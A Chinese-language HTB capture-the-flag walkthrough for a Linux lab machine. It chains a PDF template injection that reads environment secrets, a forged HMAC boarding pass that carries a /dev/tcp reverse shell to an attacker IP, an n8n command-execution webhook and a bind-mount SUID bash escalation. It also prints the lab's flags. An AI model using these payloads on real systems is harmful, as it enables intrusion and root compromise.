---
title: "HTB Takeoff：PDF 模板注入、登机牌 HMAC 伪造与 n8n 容器逃逸"
date: 2026-11-14
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Linux提权", "SSTI", "HMAC", "n8n", "Docker"]
description: "HTB Takeoff（Linux）实战：PDF 模板注入读环境变量，伪造登机牌 HMAC 进入主机，n8n 容器写 SUID bash 拿 root"
draft: false
password: true
---

Takeoff 是一台航空订票主题的 Linux 机器。表面只有 nginx 和 SSH，真正的入口藏在「行程单 PDF」的模板渲染里：备注字段可以调用 Go 模板函数读任意文件，环境变量里躺着登机牌签名密钥和 n8n API Key。伪造一张通过 HMAC 校验的登机牌就能在核验口执行命令，之后借 n8n 的容器拿到主机 `kpark` 的 shell，最后用容器与主机共享的 bind mount 放一个 SUID bash 收尾。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.250.248（Takeoff） |
| 系统 | Linux / Medium |
| 入口 | 行程单 PDF 的 Go 模板注入（`.File`） |
| 关键点 | 环境变量泄漏、gob + HMAC 登机牌伪造、n8n Execute Command、bind mount 写 SUID bash |

## 0. 侦察

全端口只有 22 和 80。80 端口跑的是 nginx，应用域名 `takeoff.htb`：

```bash
nmap -Pn -p 22,80 -sV --version-light 10.129.250.248
echo '10.129.250.248 takeoff.htb' >> /etc/hosts
```

![1](/takeoff/01-nmap.png)

首页是「HTB Airways Booking」，一个 Go/Echo + htmx 的订票系统。注册一个账号（`tester@htb.htb / Passw0rd123`）并登录，选一班航班、挑座位、下单，拿到订单号：

```bash
curl -s -c tk -d 'email=tester@htb.htb&password=Passw0rd123' http://takeoff.htb/sign-in
curl -s -b tk -d 'schedule_id=8289&seat_ids=81&email=tester@htb.htb' -D- http://takeoff.htb/book/start
# -> Location: /book/FBXQKE/passengers
curl -s -b tk -d 'full_name=Tester One&dob=1990-01-01&id_type=passport&id_number=A1234567&email=tester@htb.htb' \
  http://takeoff.htb/book/FBXQKE/passengers
curl -s -b tk -d 'payment_card_id=1' http://takeoff.htb/book/FBXQKE/payment
```

## 1. 行程单 PDF 的模板注入

登录后 `/tickets/FBXQKE` 可以给车票写备注，预览接口 `/tickets/FBXQKE/preview` 会原样回显，下载接口 `/tickets/FBXQKE/download` 则把备注渲染进 PDF。先试模板语法：

```bash
curl -s -b tk --data-urlencode 'notes=MARK> {{.File "/etc/hostname"}} <MARK' \
  http://takeoff.htb/tickets/FBXQKE/notes
curl -s -b tk http://takeoff.htb/tickets/FBXQKE/download -o t.pdf
```

在 PDF 文本里读到了 `MARK> takeoff.htb <MARK`——备注被当作 Go 模板执行，且渲染器里注册了 `.File` 函数。这等于拿到一个任意文件读取（以 `www-data` 身份）。

![2](/takeoff/02-ssti.png)

重点看进程环境变量：

```bash
{{.File "/proc/self/environ"}}
```

里面有两个关键值：

```text
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVj...
```

`/proc/self/cmdline` 指向 `/opt/htb-airways/booking/htb-air`，systemd 单元由 `www-data` 运行（`ProtectHome=true`、`ProtectSystem=strict`），所以直接读 `/home`、`/root` 都会看到空目录。

## 2. 登机牌：gob + HMAC

登机口核验接口是 `POST /api/check-in`，参数 `qr_data` 和 `gate`。`qr_data` 是 base64，解码后是一个 gob 编码的 `VerifyTicketAuthenticity` 结构：

```text
[gob 类型描述][字符串长度 0xA2=162][JSON 162 字节]\x00[32 字节 HMAC]
```

JSON 里带着航班信息和一个会被服务端执行的 `NotifyCmd`：

```json
{"PNR":"FBXQKE","Token":"c92f8a26...","Seat":"1A","Passenger":"Tester One",
 "NotifyCmd":"check-in-notify --pnr FBXQKE --email tester@htb.htb"}
```

签名方案可以直接验证：`HMAC-SHA256(TICKET_VALIDATION_TOKEN, gob 原始字节[0:结束的 0x00])` 正好等于末尾 32 字节；随便改一个字节就会返回 `invalid_signature`。

因此不需要重新编码 gob：只要保证 JSON 总长仍是 162 字节，做**等长替换**，前面的长度字节和偏移全都不变，重新算 HMAC 即可。把 `NotifyCmd` 换成同样 51 字节的反连命令（尾部补空格）：

```text
check-in-notify --pnr FBXQKE --email tester@htb.htb
sh -c 'sh -i >& /dev/tcp/10.10.16.245/4446 0>&1'
```

注意 `gate=WEB` 只是网页端标记已值机，不会执行 `NotifyCmd`；换成 `gate=GATE` 才会走检票口逻辑真正执行命令。

![3](/takeoff/03-qr-forge.png)

响应里 `status: ok`，`NotifyCmd` 已经是我们伪造的值，`www-data` 的 shell 也就回来了。

## 3. 主机上的 n8n

`www-data` 权限下能看到主机上还起着两个只监听本地端口的服务：

```text
127.0.0.1:3000  htb-air
127.0.0.1:5678  n8n
127.0.0.1:3306  mysql
```

n8n 的进程是 root，配置里写着 `N8N_USER_MANAGEMENT_DISABLED=true`。用环境变量里的 `N8N_API_KEY` 直接打 n8n 的 public API 就能读写工作流：

```bash
curl -s -H "X-N8N-API-KEY: $N8N_API_KEY" http://127.0.0.1:5678/api/v1/workflows
```

新建一个工作流：Webhook → Execute Command → Respond to Webhook，命令参数直接取查询串：

```json
{"name":"pwn","nodes":[
  {"parameters":{"path":"pwn","responseMode":"responseNode","options":{}},
   "name":"Webhook","type":"n8n-nodes-base.webhook","typeVersion":2,"webhookId":"pwnwh"},
  {"parameters":{"command":"={{$json.query.cmd}}"},
   "name":"Exec","type":"n8n-nodes-base.executeCommand","typeVersion":1},
  {"parameters":{"respondWith":"text","responseBody":"={{$json.stdout}}"},
   "name":"Respond","type":"n8n-nodes-base.respondToWebhook","typeVersion":1}
 ],"connections":{"Webhook":{"main":[[{"node":"Exec","type":"main","index":0}]]},
 "Exec":{"main":[[{"node":"Respond","type":"main","index":0}]]}},"settings":{}}
```

`POST /api/v1/workflows` 创建后，`POST /api/v1/workflows/<id>/activate` 激活，然后：

```bash
curl -s --get --data-urlencode 'cmd=id' http://127.0.0.1:5678/webhook/pwn
# uid=0(root) gid=0(root) groups=0(root)
```

命令执行在 n8n 容器 `f1bfbbddcdd4` 里，身份是 root，但这只是容器 root，不是主机 root。

![4](/takeoff/04-n8n-rce.png)

## 4. bind mount 与 SUID bash

容器的 `mountinfo` 暴露了关键的一条：

```text
/home/kpark /root rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```

主机用户 `kpark` 的家目录被 bind mount 到了容器的 `/root`，而且容器是以 root 运行的——Docker 默认不做 user namespace 映射，容器 root 写入这个挂载点，落盘就是主机的 root。容器里的 `/root/user.txt` 正是主机的 `/home/kpark/user.txt`：

![5](/takeoff/05-user-flag.png)

这也顺便说明了为什么 `www-data` 看不到 `/home`：它的 systemd 单元开了 `ProtectHome=true`，`/home` 在它的命名空间里是空的，而容器里的 `/root` 是真实的主机目录。

到这一步思路就清楚了：往这个挂载点里放一个 root 拥有的 SUID 程序。容器是 Alpine 精简镜像，没有 bash，于是从 Debian 的 `bash-static` 包里取一个静态 bash，传进 `/home/kpark/bash`，再借容器 root 改属主和权限：

```bash
# 容器内（经 webhook）
chown root:root /root/bash; chmod 4755 /root/bash
# -rwsr-xr-x 1 root root 2565504 /root/bash
```

只剩一个 `kpark` 的登录问题。同样利用这个挂载点，以容器 root 写 `/home/kpark/.ssh/authorized_keys`（属主改成 `1001:1001`），就可以用私钥 SSH 进 `kpark`：

```bash
ssh -i kpark_key kpark@takeoff.htb
cat /home/kpark/user.txt
```

最后执行 SUID bash。`bash -p` 会保留 euid，于是拿到主机的 root：

```bash
/home/kpark/bash -p -c 'id; cat /root/root.txt'
# uid=1001(kpark) gid=1001(kpark) euid=0(root) groups=1001(kpark)
```

![6](/takeoff/06-root-flag.png)

## 5. Flag

```text
user.txt  e3942b3ad97694babd0eaa2dc37b33da
root.txt  72d14fdabf3f6eee2963740a23d6d8b5
```

## 小结

这条链的每一环都踩在上一个组件的信任上：PDF 渲染器信任了用户备注（模板注入），检票口信任了 QR 里的 HMAC（但密钥就躺在环境变量里），Docker 信任了容器 root（bind mount 直通主机），而 `kpark` 的家目录又信任了 root 可写的 `authorized_keys`。等长替换 + 重算 HMAC 是这个盒子的题眼：不碰 gob 编码，只改 JSON，签名照样成立。
